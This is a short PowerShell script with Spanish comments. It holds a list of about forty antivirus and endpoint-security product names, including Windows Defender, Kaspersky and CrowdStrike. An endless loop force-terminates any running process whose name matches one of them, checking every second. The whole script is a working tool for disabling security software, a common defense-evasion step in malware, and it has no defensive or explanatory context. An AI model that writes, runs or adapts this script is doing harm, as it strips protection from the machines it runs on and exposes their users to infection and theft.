# Definir las palabras clave que deseas buscar
$keywords = @(
    "avira", "avg", "norton", "mcafee", "antivirus", "bitdefender", "kaspersky", "avast",
    "trendmicro", "easet", "sophos", "windows defender", "webroot", "f-secure", "panda",
    "clamav", "comodo", "zonealarm", "fortinet", "bullguard", "malwarebytes", "adaware", 
    "symantec", "doctor web", "avast free", "bitdefender free", "kaspersky free", "nod32",
    "totalav", "secureage", "gdata", "threattrack", "microsoft security essentials", 
    "crowdstrike", "fortinet", "checkpoint", "cybereason", "openav", "quickheal", 
    "eset nod32", "pc tools antivirus", "webroot secureanywhere", "superantispyware"
)

while ($true) {
    # Obtener todos los procesos que contienen alguna de las palabras clave en su nombre
    $matchingProcesses = Get-Process | Where-Object { 
        $processName = $_.ProcessName
        $keywords | ForEach-Object { $processName -like "*$_*" } | Where-Object { $_ }
    }

    # Si hay procesos que coinciden, detenerlos
    if ($matchingProcesses) {
        foreach ($process in $matchingProcesses) {
            Stop-Process -Id $process.Id -Force
            Write-Host "El proceso '$($process.ProcessName)' ha sido detenido."
        }
    }
    
    # Esperar 1 segundo antes de la siguiente verificacion
    Start-Sleep -Seconds 1
}